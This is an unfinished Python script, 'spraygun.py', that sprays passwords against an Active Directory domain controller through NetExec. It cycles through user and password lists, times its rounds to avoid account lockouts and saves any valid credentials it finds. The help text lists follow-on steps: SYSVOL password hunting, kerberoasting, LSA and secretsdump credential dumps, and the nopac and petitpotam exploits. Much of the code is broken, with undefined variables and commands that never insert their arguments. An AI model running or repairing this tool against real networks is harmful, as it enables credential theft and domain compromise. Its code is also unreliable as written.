#!/usr/bin/env python

######
######
#STILL DEBUGGING
#####
######

import logging
import os
import sys
import argparse
import datetime
import time
import subprocess

##################################################################################################################
# Show how to use
##################################################################################################################
parser = argparse.ArgumentParser(
        add_help = True,
    	prog='spraygun.py',
    	formatter_class=argparse.RawTextHelpFormatter,
        description='Spraygun Help for noobs')

parser.add_argument('-dc-ip', help='Domain Controller IP address', action='store')
parser.add_argument('-d', help='Domain -- NetExec finds this automatically --', action='store')
parser.add_argument('-u', help='Users file (one user per line)', action='store')
parser.add_argument('-p', help='Password file (one password per line)', action='store')
parser.add_argument('-r', help='Number of passwords to spray per round', action='store')
parser.add_argument('-t', help='Time in minutes to sleep between spray rounds', action='store')
parser.add_argument('-e', action='store_true', help='''\
Enumeration level once good creds are found:
    Level 1 : check for network shares & pull SYSVOL to search for passwords & kerberoasting
    Level 2 : check for admin across network range'
    Level 3 : check for admin dumps (nxc --lsa module or secretsdump)
    Level 4 : check for authenticated exploits (nopac, petitpotam ...)
                    ''')

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
    

# making 'args' available to parse inputs
args = parser.parse_args()





#^^^^^^^^^^^^^^^^^^^^^^^^^^
#WORKING
#^^^^^^^^^^^^^^^^^^^^^^^^^^



#countdown timer to show mins:secs until next spray
def countdown_timer():
    while seconds > 0:
        remaining_time = f"{seconds // 60}:{seconds % 60:02d}"
        print(f"Time until next spray : {remaining_time}")
        seconds -= 1
        # Adjust sleep time to avoid rounding errors
        time.sleep(1 - (time.time() % 1 )) # Sleep for approximately one second

def get_user_choice():
    while True:
        user_choice = input("Press 'c' to continue, or 'q' to quit").lower()
        if user_choice in ("c", "q"):
            return user_choice
        else:
            print("Press 'c' to continue, or 'q' to quit")

##################################################################################################################
# START SPRAY LOOP
##################################################################################################################
# user inputs in mins, mins * 60 = seconds?

# making files
os.system('touch creds.txt')
os.system('touch used-passwords.txt')
os.system('touch tmp-creds.txt')
os.system('touch passwords-in-use.txt')
os.system('cat args.p > passwords-in-use.txt')
os.system('touch sprays.log')

#opening source files
with open(args.f, 'r') as pwds:
	print(file.read())
with open(args.u, 'r') as users:
	print(users.read())

# assigning vars
seconds = args.t * 60
count = len(pwds.readlines())
tmpcreds = open("tmp-creds.txt", "w")
write_to_creds = open("creds.txt", "a")
now = datetime.datetime.now()
logtime = print(now.strftime("%Y-%m-%d %H:%M:%S"))
spraylog = open("sprays.log", "a")



# meat and potatos 
# pulls all passwords into "passwords-in-use.txt" in order to edit file and keep original
# take top two (or provided) lines from file and sprays with netexec
# puts used password into "used-passwords.txt"
# sleeps
while count > 0:
    with open("passwords-in-use.txt", "r") as inuse:
    	first_two_lines = [line.strip() for line in inuse.readlines()[:2]]
    

    for line in first_two_lines:
        #spraylog.write(logtime)
        spraylog.write(f"{logtime} {line}\n")
        #print(logtime)
        print(f"{logtime} {line}")
        print("Starting spray with : ", pwd)
        os.system('nxc smb args.dc-ip -u args.u -p {pwd} --continue-on-success --log sprays.log')
        os.system('echo pwd >> used-passwords.txt')
        spraylog.write(logtime)

# prints found creds based on [+] from netexec
# prints creds and puts into file "creds.txt"        
    print("Found creds : ")
    with open("sprays.log", "r") as creds:
        for line in creds.readlines():
            if '[+]' in line:
                print(line)
                tmpcreds.write(line)
                tmpcreds.close()
                write_to_creds.write(logtime)
                write_to_creds.write(line)
                write_to_creds.close()
                os.system("sort -u tmp-creds.txt > creds.txt")
                print("creds added to creds.txt")
                # need to clean this output to user : password only
    
    with open("sprays.log", "r") as lockout:
        for line in lockout.readlines():
            if "LOCKED_OUT" in line:
            # need to verify this is the locked out from nxc
                print("=======================")
                print("ACCOUNTS LOCKED OUT: ")
                print("=======================")
                print("")
                print(line)
                user_choice = get_user_choice()
                if user_choice == "c":
                    continue
                else:
                    break
                
    
    countdown_timer()
    print("Time of last spray : ")
    print("Time until next spray : ")

                


	


#pending shit




# spray
# loop through nxc with any amount of passwords per mins and check for lockout

#pwd_file = args.p
#    with open(args.p, 'r') as passwd:
#        for line in passwd:
#            print(line)



# prints out all lines of file
args = parser.parse_args()

